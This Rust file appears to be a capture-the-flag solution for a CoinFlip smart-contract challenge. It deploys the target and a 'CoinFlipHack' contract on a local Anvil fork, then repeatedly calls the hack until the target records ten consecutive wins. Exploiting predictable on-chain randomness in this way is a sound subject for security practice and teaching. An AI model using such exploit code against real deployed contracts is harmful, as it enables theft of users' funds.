use alloy::providers::{Provider, ProviderBuilder};
use alloy::{rpc::types::TransactionRequest, sol};
use alloy_eips::{BlockId, BlockNumberOrTag};
use alloy_primitives::utils::parse_ether;
use eyre::Result;
use tokio::time::{interval, Duration};

sol!(
    #[allow(missing_docs)]
    #[sol(rpc)]
    CoinFlip,
    "../client/src/contracts/out/CoinFlip.sol/CoinFlip.json"
);

sol!(
    #[allow(missing_docs)]
    #[sol(rpc)]
    CoinFlipHack,
    "out/CoinFlipHack.sol/CoinFlipHack.json"
);

pub async fn solution_coin_flip() -> Result<()> {
    let rpc_url = "http://localhost:8545";
    let provider =
        ProviderBuilder::new().on_anvil_with_wallet_and_config(|anvil| anvil.fork(rpc_url))?;
    let accounts = provider.get_accounts().await?;

    let target_contract = CoinFlip::deploy(&provider).await?;
    let contract = CoinFlipHack::deploy(&provider).await?;

    loop {
        let consecutive_wins: u64 = target_contract
            .consecutiveWins()
            .call()
            .await?
            .to_string()
            .parse()
            .unwrap();
        println!("consecutive_wins: {consecutive_wins}");
        tokio::time::sleep(Duration::from_millis(1000)).await;
        if consecutive_wins == 10 {
            break;
        }

        let call_builder = contract.flip(target_contract.address().clone());
        let calldata = call_builder.calldata().to_owned();
        let tx = TransactionRequest::default()
            .from(accounts[1])
            .to(contract.address().clone())
            .input(calldata.into());
        let pending_tx = provider.send_transaction(tx).await?;
        println!("Transaction hash: {}", pending_tx.tx_hash());
    }
    Ok(())
}
